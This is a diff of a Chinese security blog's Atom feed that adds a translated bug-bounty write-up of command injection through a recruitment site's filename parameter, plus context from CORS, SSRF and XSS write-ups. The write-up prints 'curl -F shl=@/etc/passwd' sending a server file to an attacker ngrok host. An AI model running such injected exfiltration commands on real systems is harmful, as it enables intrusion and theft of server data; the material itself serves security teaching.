@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://TimeS0ng.github.io/"/>
-  <updated>2018-12-27T08:57:15.975Z</updated>
+  <updated>2019-02-14T02:52:08.637Z</updated>
   <id>http://TimeS0ng.github.io/</id>
   
   <author>
@@ -14,6 +14,34 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>第十三篇：命令执行</title>
+    <link href="http://TimeS0ng.github.io/2019/02/14/%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AF%87%EF%BC%9A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    <id>http://TimeS0ng.github.io/2019/02/14/第十三篇：命令执行/</id>
+    <published>2019-02-14T02:19:44.000Z</published>
+    <updated>2019-02-14T02:52:08.637Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="原文：Command-Injection-PoC"><a href="#原文：Command-Injection-PoC" class="headerlink" title="原文：Command Injection PoC"></a>原文：<a href="https://medium.com/bugbountywriteup/command-injection-poc-72cc3743f10d" target="_blank" rel="external">Command Injection PoC</a></h4><h4 id="漏洞：文件名导致RCE"><a href="#漏洞：文件名导致RCE" class="headerlink" title="漏洞：文件名导致RCE"></a>漏洞：文件名导致RCE</h4><h4 id="作者：NoGe"><a href="#作者：NoGe" class="headerlink" title="作者：NoGe"></a>作者：<a href="https://medium.com/@p4c3n0g3" target="_blank" rel="external">NoGe</a></h4><h4 id="难度：中"><a href="#难度：中" class="headerlink" title="难度：中"></a>难度：中</h4><a id="more"></a>
+<h4 id="我在某个招聘网站发现了一个命令注入漏洞，很有趣的是它的注入参数居然是文件名，下面是漏洞复现过程！"><a href="#我在某个招聘网站发现了一个命令注入漏洞，很有趣的是它的注入参数居然是文件名，下面是漏洞复现过程！" class="headerlink" title="我在某个招聘网站发现了一个命令注入漏洞，很有趣的是它的注入参数居然是文件名，下面是漏洞复现过程！"></a>我在某个招聘网站发现了一个命令注入漏洞，很有趣的是它的注入参数居然是文件名，下面是漏洞复现过程！</h4><h4 id="首先我用命令”sleep-5”来对参数进行测试，发现响应延迟了5-6秒"><a href="#首先我用命令”sleep-5”来对参数进行测试，发现响应延迟了5-6秒" class="headerlink" title="首先我用命令”sleep 5”来对参数进行测试，发现响应延迟了5-6秒"></a>首先我用命令”sleep 5”来对参数进行测试，发现响应延迟了5-6秒</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/1.png" alt=""></p>
+<h4 id="我再次用命令”sleep-10”来进行验证，发现响应延迟了10-11秒，这让我确信这里确实存在漏洞"><a href="#我再次用命令”sleep-10”来进行验证，发现响应延迟了10-11秒，这让我确信这里确实存在漏洞" class="headerlink" title="我再次用命令”sleep 10”来进行验证，发现响应延迟了10-11秒，这让我确信这里确实存在漏洞"></a>我再次用命令”sleep 10”来进行验证，发现响应延迟了10-11秒，这让我确信这里确实存在漏洞</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/2.png" alt=""></p>
+<h4 id="接着我尝试去ping我的服务器”ping-c-5-lt-VPS-IP-gt-”，并在服务器上运行”tcpdump-i-lt-interface-gt-n-icmp”进行抓包"><a href="#接着我尝试去ping我的服务器”ping-c-5-lt-VPS-IP-gt-”，并在服务器上运行”tcpdump-i-lt-interface-gt-n-icmp”进行抓包" class="headerlink" title="接着我尝试去ping我的服务器”ping -c 5 &lt; VPS IP &gt;”，并在服务器上运行”tcpdump -i &lt; interface &gt; -n icmp”进行抓包"></a>接着我尝试去ping我的服务器”ping -c 5 &lt; VPS IP &gt;”，并在服务器上运行”tcpdump -i &lt; interface &gt; -n icmp”进行抓包</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/3.png" alt=""></p>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/4.png" alt=""></p>
+<h4 id="下面我在VPS上用ngrok搭建web服务”-ngrok-http-80”，然后在客户端文件名参数上执行”curl-blablabla-ngrok-io”"><a href="#下面我在VPS上用ngrok搭建web服务”-ngrok-http-80”，然后在客户端文件名参数上执行”curl-blablabla-ngrok-io”" class="headerlink" title="下面我在VPS上用ngrok搭建web服务”./ngrok http 80”，然后在客户端文件名参数上执行”curl blablabla.ngrok.io”"></a>下面我在VPS上用ngrok搭建web服务”./ngrok http 80”，然后在客户端文件名参数上执行”curl blablabla.ngrok.io”</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/5.png" alt=""></p>
+<h4 id="现在看看ngrok-web界面的响应，我收到来自IP地址000-000-39-169的request请求，这和上面的ICMP请求IP一致"><a href="#现在看看ngrok-web界面的响应，我收到来自IP地址000-000-39-169的request请求，这和上面的ICMP请求IP一致" class="headerlink" title="现在看看ngrok web界面的响应，我收到来自IP地址000.000.39.169的request请求，这和上面的ICMP请求IP一致"></a>现在看看ngrok web界面的响应，我收到来自IP地址000.000.39.169的request请求，这和上面的ICMP请求IP一致</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/6.png" alt=""></p>
+<h4 id="现在我可以使用命令”curl-F-shl-etc-passwd-blabla-ngrok-io”来读取服务器上的文件并发送到我的ngrok地址。"><a href="#现在我可以使用命令”curl-F-shl-etc-passwd-blabla-ngrok-io”来读取服务器上的文件并发送到我的ngrok地址。" class="headerlink" title="现在我可以使用命令”curl -F shl=@/etc/passwd blabla.ngrok.io”来读取服务器上的文件并发送到我的ngrok地址。"></a>现在我可以使用命令”curl -F shl=@/etc/passwd blabla.ngrok.io”来读取服务器上的文件并发送到我的ngrok地址。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -F shl=@/etc/passwd blabla.ngrok.io</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/7.png" alt=""></p>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/8.png" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;原文：Command-Injection-PoC&quot;&gt;&lt;a href=&quot;#原文：Command-Injection-PoC&quot; class=&quot;headerlink&quot; title=&quot;原文：Command Injection PoC&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://medium.com/bugbountywriteup/command-injection-poc-72cc3743f10d&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Command Injection PoC&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：文件名导致RCE&quot;&gt;&lt;a href=&quot;#漏洞：文件名导致RCE&quot; class=&quot;headerlink&quot; title=&quot;漏洞：文件名导致RCE&quot;&gt;&lt;/a&gt;漏洞：文件名导致RCE&lt;/h4&gt;&lt;h4 id=&quot;作者：NoGe&quot;&gt;&lt;a href=&quot;#作者：NoGe&quot; class=&quot;headerlink&quot; title=&quot;作者：NoGe&quot;&gt;&lt;/a&gt;作者：&lt;a href=&quot;https://medium.com/@p4c3n0g3&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;NoGe&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;难度：中&quot;&gt;&lt;a href=&quot;#难度：中&quot; class=&quot;headerlink&quot; title=&quot;难度：中&quot;&gt;&lt;/a&gt;难度：中&lt;/h4&gt;
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>第十二篇翻译：反射型XSS</title>
@@ -44,7 +72,7 @@
     <link href="http://TimeS0ng.github.io/2018/12/27/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9ACSRF%E6%BC%8F%E6%B4%9E/"/>
     <id>http://TimeS0ng.github.io/2018/12/27/第十一篇翻译：CSRF漏洞/</id>
     <published>2018-12-27T07:41:25.000Z</published>
-    <updated>2018-12-27T07:43:31.103Z</updated>
+    <updated>2019-01-25T01:10:21.706Z</updated>
     
     <content type="html"><![CDATA[<h4 id="原文：CSRF-account-takeover-Explained-Automated-Manual-—-Bug-Bounty"><a href="#原文：CSRF-account-takeover-Explained-Automated-Manual-—-Bug-Bounty" class="headerlink" title="原文：CSRF account takeover Explained Automated/Manual — Bug Bounty"></a>原文：<a href="https://medium.com/bugbountywriteup/csrf-account-takeover-explained-automated-manual-bug-bounty-447e4b96485b" target="_blank" rel="external">CSRF account takeover Explained Automated/Manual — Bug Bounty</a></h4><h4 id="漏洞：CSRF"><a href="#漏洞：CSRF" class="headerlink" title="漏洞：CSRF"></a>漏洞：CSRF</h4><h4 id="作者：Vulnerables"><a href="#作者：Vulnerables" class="headerlink" title="作者：Vulnerables"></a>作者：<a href="https://medium.com/@vulnerables?source=post_header_lockup" target="_blank" rel="external">Vulnerables</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
 <h4 id="emsp-emsp-作者给出的视屏讲解得已经够详细了，很容易理解，我就只给出视屏啦！"><a href="#emsp-emsp-作者给出的视屏讲解得已经够详细了，很容易理解，我就只给出视屏啦！" class="headerlink" title="&emsp;&emsp;作者给出的视屏讲解得已经够详细了，很容易理解，我就只给出视屏啦！"></a>&emsp;&emsp;作者给出的视屏讲解得已经够详细了，很容易理解，我就只给出视屏啦！</h4><p>|</p>
@@ -65,7 +93,7 @@
     <link href="http://TimeS0ng.github.io/2018/12/23/%E7%AC%AC%E5%8D%81%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9ACORS%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82/"/>
     <id>http://TimeS0ng.github.io/2018/12/23/第十篇翻译：CORS跨域请求/</id>
     <published>2018-12-23T10:33:56.000Z</published>
-    <updated>2019-01-25T01:10:29.156Z</updated>
+    <updated>2019-01-30T07:05:57.273Z</updated>
     
     <content type="html"><![CDATA[<h4 id="原文：Exploiting-Insecure-Cross-Origin-Resource-Sharing-CORS-api-artsy-net"><a href="#原文：Exploiting-Insecure-Cross-Origin-Resource-Sharing-CORS-api-artsy-net" class="headerlink" title="原文：Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net"></a>原文：<a href="https://blog.securitybreached.org/2017/10/10/exploiting-insecure-cross-origin-resource-sharing-cors-api-artsy-net/" target="_blank" rel="external">Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net</a></h4><h4 id="漏洞：跨域请求"><a href="#漏洞：跨域请求" class="headerlink" title="漏洞：跨域请求"></a>漏洞：跨域请求</h4><h4 id="作者：Muhammad-Khizer-Javed"><a href="#作者：Muhammad-Khizer-Javed" class="headerlink" title="作者：Muhammad Khizer Javed"></a>作者：<a href="https://blog.securitybreached.org/author/babayaga47/" target="_blank" rel="external">Muhammad Khizer Javed</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
 <h4 id="emsp-emsp-大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测"><a href="#emsp-emsp-大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测" class="headerlink" title="&emsp;&emsp;大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测"></a>&emsp;&emsp;大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl https://api.artsy.net -H &quot;Origin: https://evil.com&quot; -I</div></pre></td></tr></table></figure>
@@ -202,7 +230,7 @@
     <link href="http://TimeS0ng.github.io/2018/12/23/%E7%AC%AC%E4%BA%94%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9ASSRF-to-XSS/"/>
     <id>http://TimeS0ng.github.io/2018/12/23/第五篇翻译：SSRF-to-XSS/</id>
     <published>2018-12-23T03:53:31.000Z</published>
-    <updated>2018-12-30T03:04:38.227Z</updated>
+    <updated>2019-01-25T01:08:45.101Z</updated>
     
     <content type="html"><![CDATA[<h4 id="原文：How-Outdated-JIRA-Instances-suffers-from-multiple-security-vulnerabilities"><a href="#原文：How-Outdated-JIRA-Instances-suffers-from-multiple-security-vulnerabilities" class="headerlink" title="原文：How Outdated JIRA Instances suffers from multiple security vulnerabilities?"></a>原文：<a href="https://medium.com/@Skylinearafat/how-outdated-jira-instances-suffers-from-multiple-security-vulnerabilities-6a88c45e9ec6" target="_blank" rel="external">How Outdated JIRA Instances suffers from multiple security vulnerabilities?</a></h4><h4 id="漏洞：SSRF-XSS"><a href="#漏洞：SSRF-XSS" class="headerlink" title="漏洞：SSRF + XSS"></a>漏洞：SSRF + XSS</h4><h4 id="作者：Yeasir-Arafat"><a href="#作者：Yeasir-Arafat" class="headerlink" title="作者：Yeasir Arafat"></a>作者：Yeasir Arafat</h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
 <h4 id="emsp-emsp-我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意"><a href="#emsp-emsp-我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意" class="headerlink" title="&emsp;&emsp;我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意"></a>&emsp;&emsp;我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://jira.brown.edu/plugins/servlet/oauth/users/icon-uri?consumerUri=http://www.baidu.com</div></pre></td></tr></table></figure>
@@ -232,7 +260,7 @@
     <link href="http://TimeS0ng.github.io/2018/12/21/%E7%AC%AC%E5%9B%9B%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E/"/>
     <id>http://TimeS0ng.github.io/2018/12/21/第四篇翻译：XSS漏洞/</id>
     <published>2018-12-21T08:30:09.000Z</published>
-    <updated>2018-12-23T03:53:05.490Z</updated>
+    <updated>2019-01-25T01:10:13.271Z</updated>
     
     <content type="html"><![CDATA[<h4 id="原文：Dom-Based-XSS-in-ucweb-com"><a href="#原文：Dom-Based-XSS-in-ucweb-com" class="headerlink" title="原文：Dom Based XSS in ucweb.com"></a>原文：<a href="https://medium.com/@sudhanshur705/story-about-my-first-bug-bounty-9fe710be8241" target="_blank" rel="external">Dom Based XSS in ucweb.com</a></h4><h4 id="漏洞：XSS"><a href="#漏洞：XSS" class="headerlink" title="漏洞：XSS"></a>漏洞：XSS</h4><h4 id="作者：Sudhanshu-Rajbhar"><a href="#作者：Sudhanshu-Rajbhar" class="headerlink" title="作者：Sudhanshu Rajbhar"></a>作者：Sudhanshu Rajbhar</h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
 <h2 id="现在开始…"><a href="#现在开始…" class="headerlink" title="现在开始…."></a>现在开始….</h2><h4 id="emsp-emsp-首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb-com的子域名时，我发现了这个子域-samsung-ucweb-com-，samsung-三星？似乎有点意思，所以我尝试用浏览器去访问它"><a href="#emsp-emsp-首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb-com的子域名时，我发现了这个子域-samsung-ucweb-com-，samsung-三星？似乎有点意思，所以我尝试用浏览器去访问它" class="headerlink" title="&emsp;&emsp;首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb.com的子域名时，我发现了这个子域 samsung.ucweb.com ，samsung 三星？似乎有点意思，所以我尝试用浏览器去访问它"></a>&emsp;&emsp;首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb.com的子域名时，我发现了这个子域 samsung.ucweb.com ，samsung 三星？似乎有点意思，所以我尝试用浏览器去访问它</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/1.png" alt=""></p>
@@ -723,59 +751,6 @@
     <summary type="html">
     
       &lt;h2 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h2&gt;&lt;h4 id=&quot;本篇教程是笔者翻译国外大牛fuzzysecurity-的文章再加上个人的理解写出的关于Windows-提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢-hl0rey-的帮助和建议。&quot;&gt;&lt;a href=&quot;#本篇教程是笔者翻译国外大牛fuzzysecurity-的文章再加上个人的理解写出的关于Windows-提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢-hl0rey-的帮助和建议。&quot; class=&quot;headerlink&quot; title=&quot;本篇教程是笔者翻译国外大牛fuzzysecurity 的文章再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。&quot;&gt;&lt;/a&gt;本篇教程是笔者翻译国外&lt;a href=&quot;http://www.fuzzysecurity.com/tutorials/16.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;大牛fuzzysecurity 的文章&lt;/a&gt;再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。&lt;/h4&gt;
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>kali 代理之shadowsocks &amp; proxychains</title>
-    <link href="http://TimeS0ng.github.io/2018/03/30/kali-%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks-proxychains/"/>
-    <id>http://TimeS0ng.github.io/2018/03/30/kali-代理之shadowsocks-proxychains/</id>
-    <published>2018-03-30T09:14:16.000Z</published>
-    <updated>2019-01-25T01:17:24.173Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-最近和朋友合租了一台vps-，我搭好ss-bbr-之后居然不知道如何给kali-配置代理，真是可耻，果然Mac-用惯了之后人都会变懒！找了很久发现好多关于kali-代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！"><a href="#emsp-emsp-最近和朋友合租了一台vps-，我搭好ss-bbr-之后居然不知道如何给kali-配置代理，真是可耻，果然Mac-用惯了之后人都会变懒！找了很久发现好多关于kali-代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！" class="headerlink" title="&emsp;&emsp;最近和朋友合租了一台vps ，我搭好ss + bbr 之后居然不知道如何给kali 配置代理，真是可耻，果然Mac 用惯了之后人都会变懒！找了很久发现好多关于kali 代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！"></a>&emsp;&emsp;最近和朋友合租了一台vps ，我搭好ss + bbr 之后居然不知道如何给kali 配置代理，真是可耻，果然Mac 用惯了之后人都会变懒！找了很久发现好多关于kali 代理的文章都失效，不过我还是在网上找到了<a href="https://blog.csdn.net/qq_27766969/article/details/71593611" target="_blank" rel="external">这篇文章</a>，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！</h4><a id="more"></a>
-<h2 id="0x01-代理流程"><a href="#0x01-代理流程" class="headerlink" title="0x01. 代理流程"></a>0x01. 代理流程</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330161820_C3BORx_Screenshot.jpeg" alt=""></p>
-<h4 id="好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！"><a href="#好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！" class="headerlink" title="好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！"></a>好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！</h4><ul>
-<li>首先通过proxychains 将本地流量发往localhost 的 1080 端口</li>
-<li>localhost 的1080 端口和VPS 的8080 端口通过shadowsocks 建立 ss 连接</li>
-<li>本地流量 -&gt; localhost 1080 -&gt; VPS 8080 -&gt; 目标站点</li>
-</ul>
-<h4 id="以上就是ss-代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置"><a href="#以上就是ss-代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置" class="headerlink" title="以上就是ss 代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置"></a>以上就是ss 代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置</h4><h2 id="0x02-配置-proxychains"><a href="#0x02-配置-proxychains" class="headerlink" title="0x02. 配置 proxychains"></a>0x02. 配置 proxychains</h2><blockquote>
-<p>vim /etc/proxychains.conf</p>
-</blockquote>
-<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330163334_xF5VwI_Screenshot.jpeg" alt=""></p>
-<h2 id="0x03-配置shadowsocks"><a href="#0x03-配置shadowsocks" class="headerlink" title="0x03. 配置shadowsocks"></a>0x03. 配置shadowsocks</h2><h4 id="1-安装shadowsocks"><a href="#1-安装shadowsocks" class="headerlink" title="1. 安装shadowsocks"></a>1. 安装shadowsocks</h4><blockquote>
-<p>apt-get install python-pip &amp;&amp; pip install shadowsocks</p>
-</blockquote>
-<h4 id="2-优化shadowsocks-，这里我也不懂优化策略"><a href="#2-优化shadowsocks-，这里我也不懂优化策略" class="headerlink" title="2. 优化shadowsocks ，这里我也不懂优化策略"></a>2. 优化shadowsocks ，这里我也不懂优化策略</h4><blockquote>
-<p>vim  /etc/sysctl.d/local.conf</p>
-<p>sysctl –system  &emsp; # 优化文件保存之后执行这条命令生效 </p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"># max open files</div><div class="line">fs.file-max = 51200  </div><div class="line"># max read buffer</div><div class="line">net.core.rmem_max = 67108864  </div><div class="line"># max write buffer</div><div class="line">net.core.wmem_max = 67108864  </div><div class="line"># default read buffer</div><div class="line">net.core.rmem_default = 65536  </div><div class="line"># default write buffer</div><div class="line">net.core.wmem_default = 65536  </div><div class="line"># max processor input queue</div><div class="line">net.core.netdev_max_backlog = 4096  </div><div class="line"># max backlog</div><div class="line">net.core.somaxconn = 4096</div><div class="line"></div><div class="line"># resist SYN flood attacks</div><div class="line">net.ipv4.tcp_syncookies = 1  </div><div class="line"># reuse timewait sockets when safe</div><div class="line">net.ipv4.tcp_tw_reuse = 1  </div><div class="line"># turn off fast timewait sockets recycling</div><div class="line">net.ipv4.tcp_tw_recycle = 0  </div><div class="line"># short FIN timeout</div><div class="line">net.ipv4.tcp_fin_timeout = 30  </div><div class="line"># short keepalive time</div><div class="line">net.ipv4.tcp_keepalive_time = 1200  </div><div class="line"># outbound port range</div><div class="line">net.ipv4.ip_local_port_range = 10000 65000  </div><div class="line"># max SYN backlog</div><div class="line">net.ipv4.tcp_max_syn_backlog = 4096  </div><div class="line"># max timewait sockets held by system simultaneously</div><div class="line">net.ipv4.tcp_max_tw_buckets = 5000  </div><div class="line"># turn on TCP Fast Open on both client and server side</div><div class="line">net.ipv4.tcp_fastopen = 3  </div><div class="line"># TCP receive buffer</div><div class="line">net.ipv4.tcp_rmem = 4096 87380 67108864  </div><div class="line"># TCP write buffer</div><div class="line">net.ipv4.tcp_wmem = 4096 65536 67108864  </div><div class="line"># turn on path MTU discovery</div><div class="line">net.ipv4.tcp_mtu_probing = 1</div><div class="line"></div><div class="line"># for high-latency network</div><div class="line">net.ipv4.tcp_congestion_control = hybla</div><div class="line"></div><div class="line"># for low-latency network, use cubic instead</div><div class="line"># net.ipv4.tcp_congestion_control = cubic</div></pre></td></tr></table></figure>
-<h4 id="3-配置Shadowsocks配置文件"><a href="#3-配置Shadowsocks配置文件" class="headerlink" title="3. 配置Shadowsocks配置文件"></a>3. 配置Shadowsocks配置文件</h4><blockquote>
-<p>mkdir /root/ss &amp;&amp; cd /root/ss &amp;&amp; vim ssserver.json</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&#123;</div><div class="line">    &quot;server&quot;: &quot;my_server_ip&quot;, // 这里输入墙外服务器地址</div><div class="line">    &quot;server_port&quot;: 8080, // 墙外服务器的端口</div><div class="line">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,</div><div class="line">    &quot;local_port&quot;: 1080, // 为了安全，可修改为大于 1024 的数字</div><div class="line">    &quot;password&quot;: &quot;mypassword&quot;, // 设置一个密码</div><div class="line">    &quot;timeout&quot;: 300,</div><div class="line">    &quot;method&quot;: &quot;aes-256-cfb&quot;,//要和服务端的加密方式相同</div><div class="line">    &quot;fast_open&quot;: false</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h4 id="4-修改-python-配置文件，不然运行不了-ss"><a href="#4-修改-python-配置文件，不然运行不了-ss" class="headerlink" title="4. 修改 python 配置文件，不然运行不了 ss"></a>4. 修改 python 配置文件，不然运行不了 ss</h4><blockquote>
-<p>vim /usr/local/lib/python2.7/dist-packages/shadowsocks/crypto/openssl.py &emsp; # 修改成如下所示</p>
-</blockquote>
-<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330164846_7aMRN6_Screenshot.jpeg" alt=""></p>
-<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330165005_QFOnfG_Screenshot.jpeg" alt=""></p>
-<h4 id="5-现在可以启动-ss-使用代理，在要使用代理的应用前加proxychains-即可"><a href="#5-现在可以启动-ss-使用代理，在要使用代理的应用前加proxychains-即可" class="headerlink" title="5. 现在可以启动 ss 使用代理，在要使用代理的应用前加proxychains 即可"></a>5. 现在可以启动 ss 使用代理，在要使用代理的应用前加proxychains 即可</h4><blockquote>
-<p>sslocal -c /root/ss/ssserver.json -d start &emsp; # 重启之后需要再次运行该命令启动 ss</p>
-<p>proxychains curl ip.cn</p>
-<p>proxychains firefox</p>
-</blockquote>
-<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330165447_bwVCOz_Screenshot.jpeg" alt=""></p>
-<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330165823_L4SdgT_Screenshot.jpeg" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
